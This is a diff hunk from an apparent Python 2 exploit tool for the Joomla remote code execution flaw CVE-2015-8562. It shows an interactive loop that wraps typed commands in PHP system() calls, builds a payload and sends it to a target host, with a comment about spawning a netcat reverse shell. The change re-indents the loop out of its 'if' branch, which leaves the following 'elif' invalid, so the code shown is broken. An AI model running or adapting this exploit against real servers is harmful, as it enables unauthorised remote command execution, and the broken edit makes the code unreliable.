@@ -77,13 +77,13 @@ def main():
     else:
         proxyDict = {}
     if args.cmd:
-        print "\033[1;37;10m[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}".format(args.RHOST)
-        print "\033[1;32;10m[+] Dropping into shell-like environment to perform blind RCE"
-        while True:
-            command = raw_input('\033[1;37;10m$ ')
-            cmd_str = "system('{}');".format(command)
-            pl = generate_payload(cmd_str)
-            print get_url(args.RHOST, pl, args.method, proxyDict)
+    print "\033[1;37;10m[-] Attempting to exploit Joomla RCE (CVE-2015-8562) on: {}".format(args.RHOST)
+    print "\033[1;32;10m[+] Dropping into shell-like environment to perform blind RCE"
+    while True:
+        command = raw_input('\033[1;37;10m$ ')
+        cmd_str = "system('{}');".format(command)
+        pl = generate_payload(cmd_str)
+        print get_url(args.RHOST, pl, args.method, proxyDict)
 
     # Spawn Reverse Shell using Netcat listener & Python shell on victim
     elif args.LPORT and args.LPORT:
